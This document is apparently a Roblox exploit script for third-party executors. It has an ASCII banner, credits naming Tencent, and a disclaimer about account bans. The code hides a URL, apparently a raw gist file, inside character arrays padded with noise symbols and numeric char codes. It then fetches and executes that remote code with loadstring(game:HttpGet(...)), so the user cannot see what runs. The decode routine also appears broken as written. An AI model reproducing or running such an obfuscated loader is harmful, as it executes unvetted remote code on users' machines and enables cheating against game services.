--.dP"Y8 Yb        dP    db    88""Yb   88   88 88b 88 88 Yb    dP 888888 88""Yb .dP"Y8    db    88     
--`Ybo."  Yb  db  dP    dPYb   88__dP   88   88 88Yb88 88  Yb  dP  88__   88__dP `Ybo."   dPYb   88     
--o.`Y8b   YbdPYbdP    dP__Yb  88"""    Y8   8P 88 Y88 88   YbdP   88""   88"Yb  o.`Y8b  dP__Yb  88  .o 
--8bodP'    YP  YP    dP""""Yb 88       `YbodP' 88  Y8 88    YP    888888 88  Yb 8bodP' dP""""Yb 88ood8 

              --Credits : Tencent 
              --Licensed : API Sortex.  Thanks Yall For Support This Script
              --Support : Vega x , Delta x , Evon , Arceus x , Code x and others 
              --Support (PC) : Synpase Z , Wave , Rebel , ignite . (Some Executors Not supported Moonsec)
              --Obsfucator : Moonsec V3
              --WARNING : im not responsible for this script using or Banned Account (Sometimes Gui can Be Dectected or Patched will switch to another)
              --This Script protect to not being Patches
local a = {"h", "#", 116, "$", "t", "&", 112, "*", "s", ":", "/", "/", 47, "@"}
local b = {112, "a", 115, "^", "t", "!", 101, ".", "g", 103, "/", "g", "%"}
local c = {"p", "/", "s", "&", "o", "@", "r", "x", ".", "/", 47, "#"}
local d = {"6", "0", 49, "$", "6", 53, "c", "&", 98, 55, 51, 51, "6", 48, "4", "3", "c", "1", "b", "1", "@", 51, "b", 101, "c", 52, "c", 55, "1", "5", "a", 51, "9", "c", 55, "/", "$"}
local e = {"f", "@", "i", "&", "l", "*", "e", "s", "/", "#"}
local f = {"3", "9", 56, "*", "c", "c", 57, "@", 50, "f", "#", "1", "2", 54, "c", 52, "&", "6", 50, "d", 57, "d", 51, "*", "f", "c", 56, 54, "8", "4", "2", "&", "d", "e", "b", "4", 49, "e", "/", "#"}
local g = {"r", "&", "a", "*", "w", "#", 114}

local function decode(t) return table.concat({unpack(t)}, ""):gsub("%d+", function(c) return string.char(tonumber(c)) end) end
loadstring(game:HttpGet(decode{a,b,c,d,e,f,g}))()
